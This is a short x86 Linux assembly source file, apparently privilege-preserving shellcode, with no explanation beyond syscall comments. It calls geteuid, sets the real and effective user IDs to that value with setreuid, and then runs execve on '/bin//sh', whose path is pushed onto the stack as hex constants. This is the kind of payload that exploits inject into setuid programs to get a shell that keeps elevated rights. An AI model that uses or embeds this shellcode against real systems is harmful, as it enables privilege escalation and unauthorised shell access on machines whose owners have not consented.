


section .data

section .text
global _start

section .text
_start:

; geteuid
push byte 49
pop eax
int 0x80

; setreuid
mov ebx, eax
mov ecx, eax
push byte 70
pop eax
int 0x80

; execve
xor eax,eax
push eax
push 0x68732f2f
push 0x6e69622f
push esp
pop ebx
push eax
push ebx
mov ecx, esp
xor edx, edx
mov byte al,11
int 0x80
